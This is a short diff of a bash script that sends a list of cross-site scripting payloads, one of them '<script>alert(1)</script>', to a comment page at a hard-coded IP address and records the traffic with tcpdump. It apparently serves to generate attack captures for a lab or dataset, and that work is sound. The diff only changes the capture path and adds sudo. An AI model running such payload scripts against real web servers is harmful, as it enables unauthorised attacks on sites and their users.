@@ -2,7 +2,7 @@
 
 TARGET="http://205.174.165.68/comment.php"
 INTERFACE="eth0"
-PCAP_FILE="xss_attack_$(date +%Y%m%d_%H%M%S).pcap"
+PCAP_FILE="pcap/xss_attack_$(date +%Y%m%d_%H%M%S).pcap"
 
 PAYLOADS=(
   "<script>alert(1)</script>"
@@ -23,7 +23,7 @@ PAYLOADS=(
 )
 
 echo "[*] Starting tcpdump..."
-tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
+sudo tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
 TCPDUMP_PID=$!
 
 for payload in "${PAYLOADS[@]}"; do
